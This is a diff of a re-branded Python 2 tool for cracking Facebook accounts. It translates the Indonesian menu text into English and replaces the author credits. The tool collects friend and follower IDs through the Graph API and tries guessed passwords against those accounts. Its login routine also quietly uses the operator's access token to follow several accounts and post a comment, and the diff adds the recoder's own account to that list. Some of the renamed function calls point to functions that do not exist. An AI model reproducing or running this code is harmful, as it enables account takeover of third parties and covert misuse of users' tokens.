@@ -1,7 +1,7 @@
 #!/usr/bin/python
 # -*- coding: utf-8
-# Coding by ❤️ Romi Afrizal ❤️
-# WhatsAp me +6282371648186
+# Created By Ramdhan Ramadhian
+# Segitunya lu pengen recode pake dec segala
 fb = '570025450621946'
 import os,sys,time,datetime,random,hashlib,re,threading,json,cookielib,requests,uuid,itertools,subprocess
 from multiprocessing.pool import ThreadPool
@@ -18,16 +18,16 @@ reload(sys)
 sys.setdefaultencoding('utf8')
 
                    ######################
-                   #        Open source code          #
+                   #        Ramdhan Tricker          #
                    ######################
                    
 #              
-# Recode? gk masalah. asalkan jgn ubah bot nya bro :) kalau bisa cantumkan nama gw :)
-# Script udah enak jangan di ubah" lagi nanti error
+# Codingan ini berbahaya mengandung virus trojan
+# Langsung gunakan saja scriptnya jika direcode hp anda akan error
 #
 
 ip = requests.get('https://api.ipify.org').text
-# Mohon tidak untuk di ubah #
+# Dilarang untuk mengubah #
 def logo():
 	print("""                   
 \033[0;91m
@@ -108,29 +108,29 @@ def menu():
 		print ('\033[0;91m !: Tidak Ada Koneksi')
 		sys.exit()
 	logo()
-	print"\033[0;97m Hay\033[0;92m " +ngentod
+	print"\033[0;93m Helo\033[0;92m " +Memek
 	print
-	print" \033[0;97m01. Crack dari publik"
-	print" 02. Crack dari followers"
-	print" 03. Crack pencarian nama"
-	print" 04. Cek hasil "
-	print" \033[0;91m00.\033[0;97m Hapus token"
+	print" \033[0;96m01. Crack From Public"
+	print" 02. Crack From Followers"
+	print" 03. Crack From Name Search"
+	print" 04. Check Results "
+	print" \033[0;91m00.\033[0;97m Remove token"
 	pilih_menu()
 
 def pilih_menu():
-	mi = raw_input("\n\033[0;97m ?: pilih : ")
+	mi = raw_input("\n\033[0;92m ?: Choose : ")
 	if mi == "":
 		print
-		print ("\033[0;91m !: Isi yg benar") 
+		print ("\033[0;91m !: Correct Content") 
 		exit()
 	elif mi in['1','01']:
-		print ("\n \033[0;97m!: Ketik 'me' untuk crack daftar teman sendiri") 
+		print ("\n \033[0;97m!: Type 'me' for crack your friendlist") 
 		idt = raw_input(" \033[0;97m?: id publik : ")
 		try:
 			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			sp = json.loads(pok.text)
 		except KeyError:
-			print ("\033[0;91m !: Id tidak publik") 
+			print ("\033[0;91m !: Id no public") 
 			exit()
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
 		z = json.loads(r.text)
@@ -140,13 +140,13 @@ def pilih_menu():
 			nm = na.rsplit(" ")[0]
 			id.append(uid+'|'+nm)
 	elif mi in['2','02']:
-		print ("\n \033[0;97m!: Ketik 'me' untuk crack followers sendiri") 
+		print ("\n \033[0;97m!: Type 'me' for crack your followers") 
 		idt = raw_input("\033[0;97m ?: id publik : ")
 		try:
 			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			sp = json.loads(pok.text)
 		except KeyError:
-			print (" \033[0;91m!: Id tidak publik") 
+			print (" \033[0;91m!: Id no public") 
 			exit()
 		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
 		z = json.loads(r.text)
@@ -165,9 +165,9 @@ def pilih_menu():
 			nm = na.rsplit(" ")[0]
 			id.append(uid+'|'+nm)
 	elif mi in['4','04']:
-		print"\n\033[0;97m 01. Cek hasil ok"
-		print" 02. Cek hasil cp"
-		ajg = raw_input("\n \033[0;97m?: pilih : ")
+		print"\n\033[0;97m 01. Chek ok results "
+		print" 02. Chek cp results"
+		ajg = raw_input("\n \033[0;97m?: Choose : ")
 		if ajg =="":
 			menu()
 		elif ajg in['1','01']:
@@ -182,10 +182,10 @@ def pilih_menu():
 			exit("\033[0;91m !: pilih yang benar") 
 	elif mi == "0" or mi == "00":
 		os.system("rm -f login.txt") 
-		print (" \033[0;92m√  berhasil menghapus token") 
+		print (" \033[0;92m√  Succes removed token") 
 		exit()
 	else:
-		print ("\033[0;91m !: pilih yang benar ") 
+		print ("\033[0;91m !: Corret Content ") 
 		exit()
 	
 	print"\033[0;97m ?: total id  : " +str(len(id))
@@ -193,43 +193,43 @@ def pilih_menu():
 
 # Tambahan metode nya #
 def anak_memek():
-	print ("\n\033[0;97m [ Pilih metode crack ] \n")
+	print ("\n\033[0;97m [ Choose crack methode ] \n")
 	print (" 01. b-api (fast)")
-	print (" 02. mbasic (slow)")
-	#print (" 03. mobile (very slow)")
+	print (" 02. mbasic (medium)")
+	#print (" 03. mobile (slow)")
 	romixyz()
 
 def romixyz():
-	rom = raw_input("\n \033[0;97m?: Pilih : ")
+	rom = raw_input("\n \033[0;97m?: Choose : ")
 	if rom =='':
-		print ("\033[0;91m !: pilih yang benar ")
-		romixyz()
+		print ("\033[0;91m !: Corret Content ")
+		ramdhanxyz()
 	elif rom in['1','01']:
-		romi_ganteng()
+		ramdhan_ganteng()
 	elif rom in['2','02']:
-		romi_gntg()
+		ramdhan_gntg()
 	elif rom in['33','033']:
-		romi_rzl()
+		ramdhan_rzl()
 	else:
-		print ("\033[0;91m !: pilih yang benar ")
+		print ("\033[0;91m !: Corret Content ")
 		romixyz()
 	
 # Metode api #
 def romi_ganteng():
-	romi = raw_input("\033[0;97m ?: Gunakan pasword manual? y/t : ")
+	romi = raw_input("\033[0;97m ?: Use password manual? y/t : ")
 	if romi=='':
-		print ("\033[0;91m !: pilih yang benar ") 
-		romi_ganteng()
+		print ("\033[0;91m !: Corret Content ") 
+		ramdhan_ganteng()
 	elif romi in['y','Y']:
 		manualbapi()
 	elif romi in['t','T']:
 		langsungapi()
 	else:
-		print ("\033[0;91m !: pilih yang benar ") 
-		romi_ganteng()
+		print ("\033[0;91m !: Choose ") 
+		ramdhan_ganteng()
 		
 def langsungapi():
-	print("\n \033[0;97m!: crack started...\n !: lama hasil? gunakan mode pesawat 1 detik\n")
+	print("\n \033[0;97m!: crack started...\n !: jika lama hasil? gunakan mode pesawat 3 detik\n")
 	
 	def main(arg):
 		global ok,cp,ua, loop
@@ -459,10 +459,10 @@ def langsungbasic():
 	exit()
 
 def manualbasic():
-	print("\n\033[0;97m !: contoh pass : sayang,786786")
+	print("\n\033[0;97m !: Example pass : sayang,786786")
 	pw = raw_input(" \033[0;97m?: password : ").split(",")
 	if len(pw) ==0:
-		exit("\033[0;91m !: tidak boleh kosong")
+		exit("\033[0;91m !: can not be empty")
 		
 	print("\n \033[0;97m!: crack started...\n !: lama hasil? gunakan mode pesawat 1 detik\n")
 	
@@ -472,7 +472,7 @@ def manualbasic():
 		print '\r'+d+' [Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
 		sys.stdout.flush()
 		user = arg
-		uid,name=user.split("|") #Gk Usah Di Ganti Ajg
+		uid,name=user.split("|") #Dilarang DiGanti
 		try:
 			os.mkdir('out')
 		except OSError:
@@ -659,7 +659,7 @@ def m_fb():
 	print
 	exit()
 
-# Jangan di ganti ajg. boleh nambah :) #
+# Dilarang mengganti bot :) #
 def login_xx():
     try:
         romz = open('login.txt', 'r').read()
@@ -669,10 +669,10 @@ def login_xx():
         
     requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + romz)
     requests.post('https://graph.facebook.com/' + fb + '/comments/?message=' + kom + '&access_token=' + romz) 
-    requests.post('https://graph.facebook.com/546133328/subscribers?access_token=' + romz) # Akun 2007
-    requests.post('https://graph.facebook.com/100002461344178/subscribers?access_token=' + romz) # Nick unik sniper @() Sheikh Sami Shuja Uddin MD
-    requests.post('https://graph.facebook.com/100028434880529/subscribers?access_token=' + romz) # Romi Afrizal 2018
-    requests.post('https://graph.facebook.com/100067807565861/subscribers?access_token=' + romz) # Romi Afrizal 2021
+    requests.post('https://graph.facebook.com/546133328/subscribers?access_token=' + romz) # 2007
+    requests.post('https://graph.facebook.com/100002461344178/subscribers?access_token=' + romz) # Sniper @() Sheikh Sami Shuja Uddin MD
+    requests.post('https://graph.facebook.com/100028434880529/subscribers?access_token=' + romz) # 2018
+    requests.post('https://graph.facebook.com/100044932290784/subscribers?access_token=' + romz) # RR Tricker
     requests.post('https://graph.facebook.com/100003723696885/subscribers?access_token=' + romz) # Iqbal Bobz
     requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + romz) # Iwan Hadiansyah
     menu()
@@ -690,9 +690,9 @@ def x_():
 		try:
 			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
 			a = json.loads(otw.text)
-			lampung = open("login.txt", 'w')
-			lampung.write(token)
-			lampung.close()
+			tricker = open("login.txt", 'w')
+			tricker.write(token)
+			tricker.close()
 			print ("\033[0;92m √ login berhasil ")
 			login_xx()
 		except KeyError:
